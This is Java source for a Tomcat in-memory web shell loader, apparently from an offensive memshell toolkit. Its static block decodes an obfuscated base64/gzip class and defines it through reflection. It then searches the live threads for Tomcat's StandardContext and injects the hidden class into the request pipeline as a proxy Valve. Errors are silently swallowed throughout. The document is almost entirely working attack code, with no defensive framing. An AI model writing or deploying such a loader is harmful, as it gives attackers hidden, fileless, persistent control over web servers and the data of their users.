package com.demo.memshell.loader;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 *
 * ValueExecMS 8
 */
public class ValveThreadLoader {
    private static String gzipObject = "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";
    private static Object object = null;

    public ValveThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!isInject(standardContext)) {
                inject(standardContext);
            }

        } catch (Throwable e) {

        }
    }

    public static boolean isInject(Object standardContext) {
        try {
            Object pipeline = getFieldValue(standardContext, "pipeline");
            Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", new Class[]{}, new Object[]{});
            for (Object valve : valves) {
                if (valve instanceof Proxy
                        && object instanceof Proxy
                        && getFieldValue(object, "h").getClass().getName().equalsIgnoreCase(getFieldValue(valve, "h").getClass().getName())) {

                    return true;
                }
            }
        } catch (Exception e) {
        }

        return false;
    }

    public static void inject(Object standardContext) {
        try {
            if (object == null)
                return;
            Object pipeline = getFieldValue(standardContext, "pipeline");
            invokeMethod(pipeline, "addValve", new Class[]{Class.forName("org.apache.catalina.Valve")}, new Object[]{object});
        } catch (Exception e) {

        }
    }

    public static void getObject() throws Exception {
        Class valueClass = Class.forName("org.apache.catalina.core.StandardContextValve");
        Constructor declaredConstructor = valueClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object standardContextValve = declaredConstructor.newInstance();

        byte[] bytes = decompress(gzipObject);

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = null;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e){
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
            String CLASSNAME = cls.getName();

            clazz = classLoader.loadClass(CLASSNAME);
        }

        Constructor constructor = clazz.getDeclaredConstructor(Object.class);
        constructor.setAccessible(true);
        Object javaObject = constructor.newInstance(standardContextValve);

        object = Proxy.newProxyInstance(valueClass.getClassLoader(), new Class[]{Class.forName("org.apache.catalina.Valve")}, (InvocationHandler) javaObject);
    }

    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new ValveThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }
}
